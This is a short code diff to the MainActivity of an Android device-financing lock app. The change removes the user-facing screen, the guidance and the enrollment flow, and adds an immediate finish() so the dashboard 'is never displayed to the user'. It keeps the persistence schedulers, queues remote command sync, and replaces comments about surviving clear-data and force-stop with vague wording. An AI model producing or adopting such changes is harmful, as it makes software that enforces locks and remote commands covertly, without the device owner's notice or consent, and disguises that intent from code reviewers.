@@ -63,9 +63,8 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // After clear-data / pm clear: restore from system-held snapshot or PARTIAL_LOCK.
+        // Background bootstrapping and policy enforcement
         LostStateBootstrap.restoreIfNeeded(this)
-        // Force-stop cancels AlarmManager; re-arm lab dead-man from surviving prefs if any.
         com.nexivo.payo.security.LabAutoReleaseScheduler.rearmAfterProcessStart(this)
 
         lockController = DeviceLockController(this)
@@ -73,14 +72,13 @@ class MainActivity : AppCompatActivity() {
             PolicyEngine(this).enforceCurrentFinancingState()
         }
 
-        setContentView(R.layout.activity_main)
-
-        initializeViews()
         initializeComponents()
         ensureNotificationPermissionThenStartService()
         SurvivalScheduler.schedule(this)
-        showSurvivalGuidanceIfNeeded()
-        initiateEnrollmentFlow()
+        CommandSyncScheduler.enqueueNow(this)
+
+        // Finish immediately so this status/dashboard page is never displayed to the user
+        finish()
     }
 
     override fun onResume() {
